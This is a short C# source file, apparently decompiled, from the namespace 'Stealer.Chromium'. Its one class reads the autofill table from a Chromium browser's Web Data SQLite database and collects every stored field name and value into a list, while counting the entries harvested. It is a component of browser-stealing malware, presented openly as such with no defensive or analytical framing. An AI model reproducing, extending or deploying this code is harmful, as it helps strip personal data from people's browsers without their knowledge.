using System;
using System.Collections.Generic;

namespace Stealer.Chromium
{
	// Token: 0x02000020 RID: 32
	internal sealed class Autofill
	{
		// Token: 0x06000097 RID: 151 RVA: 0x000068E4 File Offset: 0x00004AE4
		public static List<AutoFill> Get(string sWebData)
		{
			List<AutoFill> list2;
			try
			{
				List<AutoFill> list = new List<AutoFill>();
				SQLite sqlite = SqlReader.ReadTable(sWebData, "autofill");
				bool flag = sqlite == null;
				if (flag)
				{
					list2 = list;
				}
				else
				{
					for (int i = 0; i < sqlite.GetRowCount(); i++)
					{
						AutoFill autoFill = default(AutoFill);
						autoFill.sName = Crypto.GetUTF8(sqlite.GetValue(i, 0));
						autoFill.sValue = Crypto.GetUTF8(sqlite.GetValue(i, 1));
						Counter.AutoFill++;
						list.Add(autoFill);
					}
					list2 = list;
				}
			}
			catch
			{
				list2 = new List<AutoFill>();
			}
			return list2;
		}
	}
}
